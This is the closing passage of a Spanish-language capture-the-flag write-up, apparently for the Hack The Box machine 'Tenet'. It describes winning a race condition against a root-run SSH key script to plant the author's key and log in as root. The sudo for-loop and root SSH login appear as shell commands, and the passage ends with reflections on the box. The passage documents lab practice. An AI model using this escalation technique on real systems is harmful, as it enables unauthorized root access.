-rwxrwxr-x  1 neil neil  633 Jan 19 17:42 rounded.sh
neil@tenet:/dev/shm$ ./rounded.sh
...
```

Debemos ser rápidos, ya que borra el archivo casi inmediatamente... Pero bueno, ya lo tenemos en la máquina, aprovechemos que tenemos la contraseña del usuario `neil` para entrar mediante `SSH` a su sesión y desde ahí ejecutar `sudo /usr/local/bin/enableSSH.sh`.

```bash
–» ssh neil@10.10.10.223
neil@10.10.10.223's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)
...
neil@tenet:~$ 
```

Para ejecutar el archivo continuamente a la vez que intentamos inyectarlo podemos hacer un one-liner empleando un ciclo `for` que corra 5000 veces :P

```bash
neil@tenet:/dev/shm$ for i in {1..5000}; do sudo /usr/local/bin/enableSSH.sh; done
Successfully added root@ubuntu to authorized_keys file!
Successfully added root@ubuntu to authorized_keys file!
...
```

Despues de probar y probar, vi que algo extraño estaba pasando en la sesión que conseguimos mediante la web, ya que no teníamos el mismo output en ninguna sesión en cuanto a los archivos de la ruta `/tmp`:

![309bash_neil_tmpTrouble](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309bash_neil_tmpTrouble.png)

Así que lo más sencillo es quitarnos esa sesión y abrir otras con el usuario `neil` ya desde **SSH** :)

...

Ahora simplemente nos queda:

* Ejecutar el script que agrega nuestra llave en una sesión, 
* en otra ejecutamos el bucle `for` llamando al archivo `/usr/local/bin/enableSSH.sh` y
* finalmente probar nuestro acceso hacia la máquina, sería así:

```bash
–» ssh root@10.10.10.223
```

![309bash_rootSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309bash_rootSH.png)

Y listos, tamos dentro de la máquina. Solo nos quedaría ver las flags (:

![309flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309flags.png)

...

La explotación de objetos PHP me encanto, además de ser la primera vez que experimentaba con esa vulnerabilidad. El privesc fue más un juego :S no me gusto tanto, pero pues la idea esta buena y creo que si alcanzo a imaginármelo en alguna computadora por ahí en el mundo :P

Muchas gracias por pasarse por acá y leerse todo este conjunto de ideas, que tengas una feliz noche y a seguir rompiendo todooooooooooooooo.